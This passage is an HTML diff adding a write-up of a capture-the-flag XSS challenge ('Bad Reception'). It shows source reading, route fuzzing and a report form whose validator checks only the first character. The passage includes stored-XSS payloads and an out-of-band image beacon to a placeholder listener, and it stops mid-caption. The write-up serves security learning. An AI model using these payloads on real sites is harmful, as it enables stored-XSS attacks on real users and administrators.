@@ -1,0 +1,1204 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Bad Reception · Intigriti 0826 write-up</title>
+<meta name="description" content="Step-by-step write-up of Intigriti's August 2026 XSS challenge: prefix-only validation, stored HTML injection into an admin bot, and a JSONP gadget that defeats script-src 'self' to read a forbidden channel.">
+<meta name="color-scheme" content="light dark">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>&#128250;</text></svg>">
+
+<meta property="og:type" content="article">
+<meta property="og:title" content="Bad Reception · Intigriti 0826">
+<meta property="og:description" content="Prefix-only validation, stored HTML injection, and a JSONP gadget that defeats script-src 'self'.">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Bad Reception · Intigriti 0826">
+<meta name="twitter:description" content="Prefix-only validation, stored HTML injection, and a JSONP gadget that defeats script-src 'self'.">
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=IBM+Plex+Sans+Condensed:wght@500;600;700&family=IBM+Plex+Sans:ital,wght@0,400;0,500;0,600;1,400&display=swap">
+
+<style>
+  :root {
+    --paper:#F2F4F6; --surface:#FFFFFF; --surface-2:#E8ECEF;
+    --ink:#161B21; --ink-2:#3D4753; --muted:#6B7784; --rule:#D3DAE0;
+    --signal:#0E8A80; --signal-dim:#D7EEEC; --loss:#C24122; --loss-dim:#FBE6E0;
+    --screen:#0B0E12; --screen-ink:#C9D6DD; --screen-dim:#6E7F8A;
+    --shadow:0 1px 2px rgba(22,27,33,.05), 0 8px 24px -12px rgba(22,27,33,.18);
+    --measure:70ch;
+    --step--1:clamp(.78rem,.76rem + .1vw,.84rem);
+    --step-0:clamp(1rem,.97rem + .16vw,1.09rem);
+    --step-1:clamp(1.2rem,1.13rem + .34vw,1.42rem);
+    --step-2:clamp(1.5rem,1.36rem + .68vw,2rem);
+    --step-3:clamp(2rem,1.7rem + 1.5vw,3.1rem);
+  }
+  @media (prefers-color-scheme: dark) {
+    :root:not([data-theme="light"]) {
+      --paper:#0D1014; --surface:#151A20; --surface-2:#1D242C;
+      --ink:#E2E8ED; --ink-2:#B4C0CA; --muted:#8898A5; --rule:#28313A;
+      --signal:#4ECDC4; --signal-dim:#12302F; --loss:#FF8459; --loss-dim:#381D14;
+      --screen:#070A0D; --screen-ink:#C9D6DD; --screen-dim:#6E7F8A;
+      --shadow:0 1px 2px rgba(0,0,0,.4), 0 10px 30px -14px rgba(0,0,0,.7);
+    }
+  }
+  :root[data-theme="dark"] {
+    --paper:#0D1014; --surface:#151A20; --surface-2:#1D242C;
+    --ink:#E2E8ED; --ink-2:#B4C0CA; --muted:#8898A5; --rule:#28313A;
+    --signal:#4ECDC4; --signal-dim:#12302F; --loss:#FF8459; --loss-dim:#381D14;
+    --screen:#070A0D; --screen-ink:#C9D6DD; --screen-dim:#6E7F8A;
+    --shadow:0 1px 2px rgba(0,0,0,.4), 0 10px 30px -14px rgba(0,0,0,.7);
+  }
+
+  *, *::before, *::after { box-sizing: border-box; }
+  body {
+    margin:0; background:var(--paper); color:var(--ink);
+    font-family:"IBM Plex Sans", ui-sans-serif, system-ui, sans-serif;
+    font-size:var(--step-0); line-height:1.65; -webkit-font-smoothing:antialiased;
+  }
+  .wrap { max-width:var(--measure); margin-inline:auto; padding:0 1.4rem; }
+  h1,h2,h3,h4 { font-family:"IBM Plex Sans Condensed","IBM Plex Sans",sans-serif; text-wrap:balance; line-height:1.14; margin:0; }
+  a { color:var(--signal); text-underline-offset:3px; }
+  a:focus-visible, summary:focus-visible { outline:2px solid var(--signal); outline-offset:3px; border-radius:3px; }
+  code, pre, .osd, .tag { font-family:"IBM Plex Mono", ui-monospace, monospace; }
+
+  .mast { border-bottom:1px solid var(--rule); padding:clamp(3rem,9vw,6rem) 0 2.6rem; }
+  .eyebrow {
+    font-family:"IBM Plex Mono",monospace; font-size:var(--step--1); letter-spacing:.16em;
+    text-transform:uppercase; color:var(--muted); display:flex; flex-wrap:wrap; gap:.5rem 1rem; align-items:center;
+  }
+  .eyebrow .dot { width:7px;height:7px;border-radius:50%;background:var(--loss);flex:none; }
+  h1 { font-size:var(--step-3); font-weight:700; letter-spacing:-.02em; margin:1rem 0 .8rem; }
+  .standfirst { font-size:var(--step-1); color:var(--ink-2); max-width:56ch; margin:0; }
+  .snow {
+    display:block; width:100%; height:46px; margin-top:2.2rem;
+    border-radius:4px 4px 0 0; image-rendering:pixelated; background:#0B0E12;
+    border:1px solid #000; border-bottom:0;
+  }
+  .tuning {
+    display:flex; flex-wrap:wrap; gap:.35rem 1.4rem; justify-content:center;
+    background:#0B0E12; border:1px solid #000; border-top:0; border-radius:0 0 4px 4px;
+    padding:.6rem .9rem;
+    font-family:"IBM Plex Mono",monospace; font-size:.68rem;
+    letter-spacing:.16em; text-transform:uppercase; color:#7C8B95;
+  }
+  .tuning a { color:#9DB3BC; text-decoration:none; }
+  .tuning a::before { content:"\203A "; color:#4ECDC4; }
+  .tuning a:hover { color:#4ECDC4; }
+
+  .path { margin:3rem 0 0; }
+  .path ol { list-style:none; margin:0; padding:0; display:grid; gap:.5rem; }
+  .path li {
+    display:grid; grid-template-columns:2.2rem 1fr; gap:.9rem; align-items:start; padding:.7rem .9rem;
+    background:var(--surface); border:1px solid var(--rule); border-left:3px solid var(--signal); border-radius:3px;
+  }
+  .path .n { font-family:"IBM Plex Mono",monospace; font-size:.74rem; font-weight:600; color:var(--signal); padding-top:.18rem; font-variant-numeric:tabular-nums; }
+  .path b { font-weight:600; }
+  .path span { display:block; color:var(--muted); font-size:var(--step--1); }
+
+  section { padding:3.4rem 0 0; }
+  .ch {
+    display:flex; align-items:baseline; gap:.8rem; font-family:"IBM Plex Mono",monospace;
+    font-size:.72rem; letter-spacing:.18em; text-transform:uppercase; color:var(--muted); margin-bottom:.7rem;
+  }
+  .ch::after { content:""; flex:1; height:1px; background:var(--rule); }
+  h2 { font-size:var(--step-2); font-weight:600; letter-spacing:-.015em; margin-bottom:.9rem; }
+  h3 { font-size:var(--step-1); font-weight:600; margin:2.2rem 0 .6rem; }
+  h4 {
+    font-family:"IBM Plex Mono",monospace; font-size:.74rem; letter-spacing:.13em; text-transform:uppercase;
+    color:var(--signal); margin:1.8rem 0 .5rem; font-weight:600;
+  }
+  p { margin:0 0 1.05rem; }
+  ul, ol { margin:0 0 1.05rem; padding-left:1.2rem; }
+  li { margin-bottom:.4rem; }
+  strong { font-weight:600; }
+  p code, li code, td code { background:var(--surface-2); padding:.1em .36em; border-radius:3px; font-size:.87em; word-break:break-word; }
+
+  figure { margin:1.5rem 0; }
+  .screen { position:relative; background:var(--screen); border-radius:5px; border:1px solid #000; overflow:hidden; box-shadow:var(--shadow); }
+  .screen::after {
+    content:""; position:absolute; inset:0; pointer-events:none;
+    background:repeating-linear-gradient(180deg, rgba(255,255,255,.035) 0 1px, transparent 1px 3px);
+  }
+  .screen-bar {
+    display:flex; justify-content:space-between; align-items:center; gap:1rem; padding:.5rem .85rem;
+    border-bottom:1px solid rgba(255,255,255,.09); font-family:"IBM Plex Mono",monospace;
+    font-size:.68rem; letter-spacing:.13em; text-transform:uppercase; color:var(--screen-dim);
+  }
+  .screen pre { margin:0; padding:.95rem .85rem; overflow-x:auto; color:var(--screen-ink); font-size:.8rem; line-height:1.65; }
+  .screen pre::-webkit-scrollbar { height:9px; }
+  .screen pre::-webkit-scrollbar-thumb { background:#2A343D; border-radius:9px; }
+  .k { color:#4ECDC4; } .s { color:#E2B45E; } .c { color:var(--screen-dim); font-style:italic; } .bad { color:#FF8459; }
+  figcaption { font-size:var(--step--1); color:var(--muted); margin-top:.55rem; }
+
+  .shot { margin:1.7rem 0; }
+  .hero { margin:3rem 0 0; }
+  .shot img {
+    display:block; width:100%; height:auto; border:1px solid var(--rule);
+    border-radius:5px; background:var(--surface-2); box-shadow:var(--shadow);
+  }
+  .shot figcaption { margin-top:.6rem; }
+  .shot figcaption b { color:var(--ink-2); font-weight:600; }
+
+  .note { border:1px solid var(--rule); border-left:3px solid var(--loss); background:var(--surface); border-radius:3px; padding:1rem 1.1rem; margin:1.5rem 0; }
+  .note.good { border-left-color:var(--signal); }
+  .note p:last-child { margin-bottom:0; }
+  .note .lab { font-family:"IBM Plex Mono",monospace; font-size:.68rem; letter-spacing:.15em; text-transform:uppercase; color:var(--loss); display:block; margin-bottom:.35rem; }
+  .note.good .lab { color:var(--signal); }
+
+  .tw { overflow-x:auto; margin:1.5rem 0; border:1px solid var(--rule); border-radius:4px; }
+  table { border-collapse:collapse; width:100%; font-size:var(--step--1); min-width:460px; }
+  th, td { text-align:left; padding:.68rem .85rem; border-bottom:1px solid var(--rule); vertical-align:top; }
+  th { font-family:"IBM Plex Mono",monospace; font-size:.68rem; letter-spacing:.12em; text-transform:uppercase; color:var(--muted); background:var(--surface-2); font-weight:500; }
+  tbody tr:last-child td { border-bottom:0; }
+  td:first-child { font-weight:500; }
+  .tag { display:inline-block; font-size:.66rem; letter-spacing:.1em; text-transform:uppercase; padding:.18em .5em; border-radius:3px; white-space:nowrap; }
+  .tag.hi { background:var(--loss-dim); color:var(--loss); }
+  .tag.md { background:var(--signal-dim); color:var(--signal); }
+
+  .reveal { margin:3.4rem 0 0; }
+  .crt {
+    position:relative; background:#05070A; border-radius:10px; padding:clamp(2rem,7vw,3.6rem) 1.2rem;
+    text-align:center; overflow:hidden; border:1px solid #000; box-shadow:inset 0 0 90px rgba(0,0,0,.9), var(--shadow);
+  }
+  .crt::before { content:""; position:absolute; inset:0; background:radial-gradient(ellipse at center, rgba(120,190,200,.10), transparent 62%); }
+  .crt::after { content:""; position:absolute; inset:0; pointer-events:none; background:repeating-linear-gradient(180deg, rgba(255,255,255,.05) 0 1px, transparent 1px 3px); }
+  .crt .osd { position:relative; font-size:.78rem; letter-spacing:.34em; color:#8FA3AC; margin-bottom:1.1rem; }
+  .crt .flag { position:relative; font-family:"IBM Plex Mono",monospace; font-weight:500; font-size:clamp(.72rem,2.5vw,1.06rem); color:#EAF3F6; word-break:break-all; text-shadow:0 0 14px rgba(150,220,230,.5); }
+
+  /* CRT power-on when the flag scrolls into view */
+  .crt.warming .osd, .crt.warming .flag { opacity:0; }
+  .crt.lit { animation:poweron .55s ease-out both; }
+  .crt.lit .osd  { animation:fadein .5s ease-out .45s both; }
+  .crt.lit .flag { animation:fadein .6s ease-out .62s both; }
+  @keyframes poweron {
+    0%   { transform:scaleY(.004) scaleX(.6); filter:brightness(3); }
+    45%  { transform:scaleY(.02)  scaleX(1);  filter:brightness(2.2); }
+    100% { transform:scaleY(1)    scaleX(1);  filter:brightness(1); }
+  }
+  @keyframes fadein { from { opacity:0; } to { opacity:1; } }
+  @media (prefers-reduced-motion: reduce) {
+    .crt.warming .osd, .crt.warming .flag { opacity:1; }
+    .crt.lit, .crt.lit .osd, .crt.lit .flag { animation:none; }
+  }
+  .caret { display:inline-block; width:.55em; height:1.05em; background:#EAF3F6; vertical-align:-.16em; margin-left:.22em; animation:blink 1.15s steps(1) infinite; }
+  @keyframes blink { 50% { opacity:0; } }
+  @media (prefers-reduced-motion: reduce) { .caret { animation:none; } }
+
+  details { border:1px solid var(--rule); border-radius:4px; background:var(--surface); padding:.8rem 1rem; margin-bottom:.6rem; }
+  summary { cursor:pointer; font-weight:500; }
+  details p { margin:.7rem 0 0; color:var(--ink-2); font-size:var(--step--1); }
+
+  .wrap > section:last-of-type { padding-bottom:4rem; }
+
+  /* ---------- interactive tuner ---------- */
+  .tuner {
+    display:grid; grid-template-columns:1fr 190px; gap:1rem; align-items:stretch;
+    background:linear-gradient(#4A3524,#332417); padding:1rem; border-radius:12px;
+    border:1px solid #241a11; box-shadow:var(--shadow); margin:1.6rem 0 .8rem;
+  }
+  @media (max-width:620px) { .tuner { grid-template-columns:1fr; } }
+  .tuner-screen {
+    position:relative; background:#05070A; border-radius:8px; overflow:hidden;
+    min-height:200px; border:2px solid #1b120b;
+  }
+  .tuner-screen canvas { display:block; width:100%; height:100%; image-rendering:pixelated; opacity:.5; }
+  .tuner-screen::after {
+    content:""; position:absolute; inset:0; pointer-events:none;
+    background:repeating-linear-gradient(180deg, rgba(255,255,255,.05) 0 1px, transparent 1px 3px);
+  }
+  .tv-osd {
+    position:absolute; top:.6rem; right:.8rem; z-index:2;
+    font-family:"IBM Plex Mono",monospace; font-size:.72rem; letter-spacing:.22em;
+    color:#9DB3BC; background:rgba(0,0,0,.45); padding:.2rem .45rem; border-radius:3px;
+  }
+  .tv-msg {
+    position:absolute; inset:0; z-index:2; display:flex; align-items:center; justify-content:center;
+    text-align:center; padding:1.2rem; font-family:"IBM Plex Mono",monospace;
+    font-size:clamp(.68rem,2.1vw,.9rem); line-height:1.6; color:#C9D6DD; word-break:break-all;
+  }
+  .tv-msg.win { color:#EAF3F6; text-shadow:0 0 16px rgba(150,220,230,.6); }
+  .tuner-pad { display:flex; flex-direction:column; gap:.7rem; }
+  .pad-label {
+    font-family:"IBM Plex Mono",monospace; font-size:.62rem; letter-spacing:.24em;
+    text-transform:uppercase; color:#C4A886; text-align:center;
+  }
+  .keys { display:grid; grid-template-columns:repeat(3,1fr); gap:.4rem; }
+  .keys button, .manual button {
+    font-family:"IBM Plex Mono",monospace; font-size:.82rem; font-weight:600;
+    color:#E7DCCB; background:linear-gradient(#2C2016,#1B130C);
+    border:1px solid #120c07; border-radius:5px; padding:.5rem 0; cursor:pointer;
+    box-shadow:0 2px 0 #120c07;
+  }
+  .keys button:hover, .manual button:hover { background:linear-gradient(#3A2A1C,#241a11); }
+  .keys button:active, .manual button:active { transform:translateY(2px); box-shadow:none; }
+  .keys button:focus-visible, .manual button:focus-visible, #chIn:focus-visible {
+    outline:2px solid var(--signal); outline-offset:2px;
+  }
+  .manual { display:grid; grid-template-columns:1fr auto; gap:.4rem; align-items:center; margin-top:auto; }
+  .manual label {
+    grid-column:1 / -1; font-family:"IBM Plex Mono",monospace; font-size:.62rem;
+    letter-spacing:.24em; text-transform:uppercase; color:#C4A886; text-align:center;
+  }
+  #chIn {
+    font-family:"IBM Plex Mono",monospace; font-size:.82rem; text-align:center;
+    color:#E7DCCB; background:#120c07; border:1px solid #0b0704; border-radius:5px;
+    padding:.5rem .4rem; width:100%;
+  }
+  .manual button { padding:.5rem .7rem; }
+  .tuner-hint { font-size:var(--step--1); color:var(--muted); }
+
+  /* ---------- animated explainers ---------- */
+  .anim {
+    background:var(--screen); border:1px solid #000; border-radius:5px;
+    padding:1.1rem 1rem; margin:1.5rem 0; overflow-x:auto;
+    font-family:"IBM Plex Mono",monospace; font-size:.76rem; line-height:1.9;
+    color:var(--screen-ink); box-shadow:var(--shadow);
+  }
+  .anim .row { display:flex; align-items:center; gap:.6rem; white-space:nowrap; }
+  .anim .lbl { color:var(--screen-dim); min-width:9.5rem; }
+  .anim .verdict { font-weight:600; padding:.05rem .45rem; border-radius:3px; }
+  .anim .no  { color:#FF8459; border:1px solid #5A2A1B; }
+  .anim .yes { color:#4ECDC4; border:1px solid #1B4A46; }
+
+  /* CSP explainer: two probes, one blocked, one trusted */
+  .csp .row { opacity:0; animation:step 8s infinite; }
+  .csp .row:nth-child(1) { animation-delay:0s; }
+  .csp .row:nth-child(2) { animation-delay:.9s; }
+  .csp .row:nth-child(3) { animation-delay:1.8s; }
+  .csp .row:nth-child(4) { animation-delay:3.4s; }
+  .csp .row:nth-child(5) { animation-delay:4.3s; }
+  .csp .row:nth-child(6) { animation-delay:5.2s; }
+  @keyframes step {
+    0%, 4%   { opacity:0; transform:translateX(-6px); }
+    8%, 88%  { opacity:1; transform:none; }
+    100%     { opacity:1; transform:none; }
+  }
+
+  /* URL resolution explainer */
+  .res .row { opacity:0; animation:step 7s infinite; }
+  .res .row:nth-child(1) { animation-delay:0s; }
+  .res .row:nth-child(2) { animation-delay:.8s; }
+  .res .row:nth-child(3) { animation-delay:1.6s; }
+  .res .row:nth-child(4) { animation-delay:2.6s; }
+  .res .row:nth-child(5) { animation-delay:3.8s; }
+
+  @media (prefers-reduced-motion: reduce) {
+    .anim .row { opacity:1 !important; animation:none !important; transform:none !important; }
+  }
+
+  /* ---------- payload builder ---------- */
+  .lab-panel {
+    border:1px solid var(--rule); border-radius:6px; background:var(--surface);
+    margin:1.6rem 0; overflow:hidden;
+  }
+  .lab-step {
+    display:grid; grid-template-columns:2.2rem 1fr; gap:.9rem;
+    padding:1.1rem 1.1rem; border-bottom:1px solid var(--rule);
+  }
+  .lab-step:last-child { border-bottom:0; }
+  .lab-n {
+    font-family:"IBM Plex Mono",monospace; font-size:.74rem; font-weight:600;
+    color:var(--signal); border:1px solid var(--rule); border-radius:50%;
+    width:1.7rem; height:1.7rem; display:flex; align-items:center; justify-content:center;
+  }
+  .lab-body label {
+    display:flex; align-items:center; gap:.6rem;
+    font-family:"IBM Plex Mono",monospace; font-size:.66rem; letter-spacing:.16em;
+    text-transform:uppercase; color:var(--muted); margin-bottom:.4rem;
+  }
+  .lab-body input, .lab-body textarea {
+    width:100%; font-family:"IBM Plex Mono",monospace; font-size:.76rem; line-height:1.6;
+    color:var(--screen-ink); background:var(--screen); border:1px solid #000;
+    border-radius:4px; padding:.55rem .7rem; resize:vertical; word-break:break-all;
+  }
+  .lab-body input:focus-visible, .lab-body textarea:focus-visible {
+    outline:2px solid var(--signal); outline-offset:2px;
+  }
+  .lab-note { font-size:var(--step--1); color:var(--muted); margin:.5rem 0 0; }
+  .lab-note code { word-break:break-all; }
+  .copybtn {
+    font-family:"IBM Plex Mono",monospace; font-size:.6rem; letter-spacing:.12em;
+    text-transform:uppercase; color:var(--muted); background:var(--surface-2);
+    border:1px solid var(--rule); border-radius:3px; padding:.18rem .5rem; cursor:pointer;
+  }
+  .copybtn:hover { color:var(--ink); }
+  .copybtn.done { color:var(--signal); border-color:var(--signal); }
+  .final-link { color:var(--signal); font-weight:500; word-break:break-all; }
+
+  /* ---------- scroll OSD ---------- */
+  .scroll-osd {
+    position:fixed; top:1rem; left:1rem; z-index:20; pointer-events:none;
+    font-family:"IBM Plex Mono",monospace; font-size:.68rem; letter-spacing:.2em;
+    color:var(--muted); background:var(--surface); border:1px solid var(--rule);
+    border-radius:999px; padding:.45rem .8rem; opacity:0; transition:opacity .35s;
+  }
+  .scroll-osd.on { opacity:1; }
+  @media (max-width:620px) { .scroll-osd { display:none; } }
+
+  .signoff { margin:3.4rem 0 4.5rem; text-align:center; }
+  .signoff .bars { display:flex; height:26px; border-radius:3px; overflow:hidden; margin-bottom:1.6rem; }
+  .signoff .bars i { flex:1; }
+  .signoff .eot {
+    font-family:"IBM Plex Mono",monospace; font-size:.72rem; letter-spacing:.32em;
+    text-transform:uppercase; color:var(--muted); margin-bottom:.9rem;
+  }
+  .signoff .who {
+    font-family:"IBM Plex Sans Condensed","IBM Plex Sans",sans-serif;
+    font-size:var(--step-1); font-weight:600; color:var(--ink); margin-bottom:.35rem;
+  }
+  .signoff .what { color:var(--muted); font-size:var(--step--1); margin:0; }
+  .signoff .what a { color:var(--signal); }
+
+  .themebtn {
+    position:fixed; top:1rem; right:1rem; z-index:20; font-family:"IBM Plex Mono",monospace;
+    font-size:.68rem; letter-spacing:.12em; text-transform:uppercase; background:var(--surface);
+    color:var(--muted); border:1px solid var(--rule); border-radius:999px; padding:.45rem .8rem; cursor:pointer; line-height:1;
+  }
+  .themebtn:hover { color:var(--ink); border-color:var(--muted); }
+  .themebtn:focus-visible { outline:2px solid var(--signal); outline-offset:3px; }
+  @media print { .themebtn { display:none; } }
+</style>
+</head>
+<body>
+
+<div class="wrap">
+
+  <header class="mast">
+    <div class="eyebrow">
+      <span class="dot" aria-hidden="true"></span>
+      <span>Intigriti · August 2026 · XSS Challenge 0826</span>
+    </div>
+    <h1>Bad Reception</h1>
+
+    <canvas class="snow" id="snow" width="400" height="46" aria-hidden="true"></canvas>
+    <div class="tuning">
+      <a href="https://challenge-0826.challenges.intigriti.io/challenge" target="_blank"
+         rel="noopener noreferrer">challenge&#8209;0826.challenges.intigriti.io</a>
+    </div>
+  </header>
+
+  <figure class="shot hero">
+    <img src="images/6.png"
+         alt="The challenge page: a retro brown CRT television showing static, with a channel keypad 1 to 10, under the heading Hello hacker and the line Make the TV work to capture the flag">
+    <figcaption><b>The challenge.</b> <em>"Make the TV work to capture the flag."</em> Ten channel buttons,
+      a volume dial, and a screen full of snow.</figcaption>
+  </figure>
+
+  <!-- ============================================ -->
+  <section>
+    <div class="ch">Step 01 · First contact</div>
+    <h2>What the page actually is</h2>
+    <p>Loading <code>/challenge</code> gives a 3D CRT television rendered with Babylon.js, sitting in a garden.
+      There is a keypad with channels 1 to 10, a volume dial, and a small red warning triangle in the corner
+      labelled <em>Report bad reception</em>.</p>
+
+    <p>Before touching anything, I read the page source. The HTML is short, and the interesting parts are one
+      inline <code>&lt;script&gt;</code> and the markup for the TV itself. Two things stood out immediately.</p>
+
+    <h4>Observation 1 · the video has a real, absolute source</h4>
+
+    <figure class="shot">
+      <img src="images/4.png"
+           alt="Page source of /challenge with the video source path /static/streams/static.mp4 highlighted">
+      <figcaption><b>Page source, line 37.</b> The <code>&lt;video&gt;</code> element ships with a working
+        absolute path. This one line is what makes the final step possible, because it tells us where the
+        station keeps its tapes.</figcaption>
+    </figure>
+
+    <h4>Observation 2 · tuning uses a relative one</h4>
+
+    <figure>
+      <div class="screen">
+        <div class="screen-bar"><span>/challenge ·inline script</span><span>js</span></div>
+<pre><span class="k">const</span> VALID = /^[A-Za-z0-9._-]+\.mp4$/;
+
+<span class="k">function</span> setTube(url) {
+  tube.setAttribute(<span class="s">'src'</span>, url);   <span class="c">// overrides the &lt;source&gt; child</span>
+  tube.load();
+}
+
+<span class="k">async function</span> tune(n) {
+  osd.textContent = <span class="s">'CH '</span> + pad(n);
+  <span class="k">const</span> res = <span class="k">await</span> fetch(`/api/channels/${n}/load`);
+  <span class="k">const</span> url = (<span class="k">await</span> res.text()).trim();
+  <span class="k">if</span> (VALID.test(url)) setTube(url);
+}</pre>
+      </div>
+      <figcaption>The loader returns a bare filename; <code>VALID</code> forbids a slash, so the response can
+        never carry its own directory.</figcaption>
+    </figure>
+
+    <p>And the report button, which sends whatever the on-screen display currently reads:</p>
+
+    <figure>
+      <div class="screen">
+        <div class="screen-bar"><span>/challenge ·report handler</span><span>js</span></div>
+<pre><span class="k">const</span> channelId = osd.textContent.replace(<span class="s">'CH'</span>, <span class="s">''</span>).trim();
+<span class="k">await</span> fetch(<span class="s">'/api/report'</span>, {
+  method: <span class="s">'POST'</span>,
+  headers: { <span class="s">'Content-Type'</span>: <span class="s">'application/x-www-form-urlencoded'</span> },
+  body: <span class="k">new</span> URLSearchParams({ channelId }).toString()
+});</pre>
+      </div>
+    </figure>
+
+    <p>So there are two inputs into the server: a channel number in a URL path, and a channel number in a POST
+      body. Everything that follows is the process of finding out how much each of them really accepts.</p>
+  </section>
+
+  <!-- ============================================ -->
+  <section>
+    <div class="ch">Step 02 · The fault</div>
+    <h2>Why the picture breaks the moment you tune</h2>
+    <p>On page load the TV plays fine, because that <code>&lt;source&gt;</code> child is an absolute path.
+      The moment you press a channel key the picture dies. The reason is pure URL resolution:</p>
+
+    <figure>
+      <div class="screen">
+        <div class="screen-bar"><span>URL resolution</span><span>the fault</span></div>
+<pre>loader returns   <span class="s">static.mp4</span>
+document is at   /challenge
+base directory   /
+resolves to      <span class="bad">/static.mp4</span>          <span class="c">→ 404</span>
+file really at   /static/streams/static.mp4</pre>
+      </div>
+    </figure>
+
+    <p><code>setTube()</code> sets <code>src</code> on the <code>&lt;video&gt;</code> element, which overrides the
+      child <code>&lt;source&gt;</code>, and the value is relative to <code>/challenge</code>, so it lands at the
+      web root and 404s.</p>
+
+    <div class="note">
+      <span class="lab">Trap</span>
+      <p>This is the challenge's title and its most visible defect, so it pulls hard as "the bug". It isn't.
+        Repairing the picture is achievable and yields nothing. I lost time here before accepting that the
+        broken TV is <em>scenery</em>: a puzzle that teaches you the URL layout you'll need at the very end.</p>
+    </div>
+  </section>
+
+  <!-- ============================================ -->
+  <section>
+    <div class="ch">Step 03 · Mapping the surface</div>
+    <h2>What exists, and what the loader really checks</h2>
+    <p>Directory brute force plus a method oracle (405 vs 404 distinguishes "route exists, wrong verb" from
+      "no route") gives a small surface:</p>
+
+    <div class="tw">
+      <table>
+        <thead><tr><th>Route</th><th>Method</th><th>Notes</th></tr></thead>
+        <tbody>
+          <tr><td><code>/</code></td><td>GET</td><td>rules page</td></tr>
+          <tr><td><code>/challenge</code></td><td>GET</td><td>the TV</td></tr>
+          <tr><td><code>/healthz</code></td><td>GET</td><td>returns <code>ok</code></td></tr>
+          <tr><td><code>/static/*</code></td><td>GET</td><td>assets, incl. <code>/static/streams/</code></td></tr>
+          <tr><td><code>/api/channels/&lt;id&gt;/load</code></td><td>GET</td><td>the loader</td></tr>
+          <tr><td><code>/api/report</code></td><td>POST</td><td>the complaint queue</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <p>Then I fuzzed the loader's channel parameter to learn its validation rule:</p>
+
+    <div class="tw">
+      <table>
+        <thead><tr><th>Request</th><th>Response</th><th>What it tells us</th></tr></thead>
+        <tbody>
+          <tr><td><code>/api/channels/1/load</code></td><td><code>200</code> <code>static.mp4</code></td><td>baseline</td></tr>
+          <tr><td><code>/api/channels/10/load</code></td><td><code>200</code> <code>static.mp4</code></td><td>every public channel returns the same file</td></tr>
+          <tr><td><code>/api/channels/11/load</code></td><td><code>403</code></td><td><b>403, not 404.</b> It's an authorisation decision</td></tr>
+          <tr><td><code>/api/channels/01/load</code></td><td><code>200</code></td><td>value is cast to int, not string-compared</td></tr>
+          <tr><td><code>/api/channels/²/load</code></td><td><code>500</code></td><td>unhandled exception</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <h4>The superscript-two oracle</h4>
+    <p>That 500 is worth dwelling on. In Python, <code>'²'.isdigit()</code> returns <code>True</code>, but
+      <code>int('²')</code> raises <code>ValueError</code>. Getting a 500 instead of a 403 proves the check runs
+      <code>isdigit()</code> first and <code>int()</code> second:</p>
+
+    <figure>
+      <div class="screen">
+        <div class="screen-bar"><span>inferred server logic</span><span>python</span></div>
+<pre><span class="k">if</span> cid.isdigit() <span class="k">and</span> 1 &lt;= int(cid) &lt;= 10:
+    <span class="k">return</span> stream_for(cid)
+<span class="k">return</span> <span class="s">"channel not available"</span>, 403</pre>
+      </div>
+    </figure>
+
+    <p>Two conclusions, both load-bearing: channels above ten are <strong>refused, not absent</strong>, and the
+      refusal is decided per-request, which means a different, more privileged requester might get a different
+      answer.</p>
+  </section>
+
+  <!-- ============================================ -->
+  <section>
+    <div class="ch">Step 04 · The report form</div>
+    <h2>Finding out how much the complaint queue accepts</h2>
+    <p>Normal traffic from the page looks like this, a plain form post with a two-digit channel:</p>
+
+    <figure>
+      <div class="screen">
+        <div class="screen-bar"><span>POST /api/report · baseline</span><span>http</span></div>
+<pre>POST /api/report HTTP/2
+Host: challenge-0826.challenges.intigriti.io
+Content-Type: application/x-www-form-urlencoded
+
+channelId=10
+
+<span class="c">→</span> HTTP/2 200
+<span class="c">→</span> {"id":"0afcfed9ccd3f877","status":<span class="s">"queued"</span>}</pre>
+      </div>
+      <figcaption>The word <em>queued</em> is the tell: nothing happens synchronously, so something processes
+        these later, and that something is worth finding.</figcaption>
+    </figure>
+
+    <p>Then I walked the validator. The rule turned out to be far weaker than it looks:</p>
+
+    <div class="tw">
+      <table>
+        <thead><tr><th>Body</th><th>Response</th></tr></thead>
+        <tbody>
+          <tr><td><code>channelId=1</code></td><td><code>200</code> · queued</td></tr>
+          <tr><td><code>channelId=abc</code></td><td><code>400</code> · "channel ID must start with a digit"</td></tr>
+          <tr><td><code>channelId=1abcdef</code></td><td><code>200</code> · queued</td></tr>
+          <tr><td><code>channelId=1&lt;b&gt;x&lt;/b&gt;</code></td><td><code>200</code> · queued</td></tr>
+          <tr><td><code>channelId=1&lt;svg onload=alert(1)&gt;</code></td><td><code>200</code> · queued</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="note good">
+      <span class="lab">Finding 1</span>
+      <p>The server checks only that <code>channelId[0]</code> is a decimal digit. Everything after that first
+        character is unvalidated. A single leading <code>1</code> buys arbitrary HTML into storage.</p>
+    </div>
+
+    <p>Worth noting what I <em>didn't</em> find, because it cost hours. There is also a parameter-source
+      difference: validation reads the POST body while a query-string <code>channelId</code> is accepted
+      without checks. I built an entire campaign around smuggling payloads through the query string.
+      The consumer reads the body. Every one of those payloads delivered the literal string <code>1</code>.
+      The prefix rule above is the real door, and it is simpler.</p>
+  </section>
+
+  <!-- ============================================ -->
+  <section>
+    <div class="ch">Step 05 · Proving a bot exists</div>
+    <h2>Somebody reads the complaints</h2>
+    <p>Stored HTML only matters if something renders it. The cheapest test is a beacon that needs no
+      JavaScript at all, just a plain image pointing at a listener I control:</p>
+
+    <figure>
+      <div class="screen">
+        <div class="screen-bar"><span>probe</span><span>body</span></div>
+<pre>channelId=1&lt;img src="https://YOUR-OOB/hit"&gt;</pre>
+      </div>
+      <figcaption>No handler, no script. If this fires, something parsed our markup and fetched a subresource.</figcaption>
+    </figure>
+
+    <figure class="shot">
+      <img src="images/9.png"
+           alt="Burp Repeater showing POST /api/report with body channelId=1 followed by an img tag pointing at a webhook.site URL, and a 200 queued response">
+      <figcaption><b>The probe, sent.</b> <code>channelId=1&lt;img src="https://webhook.site/…"&gt;</code> is
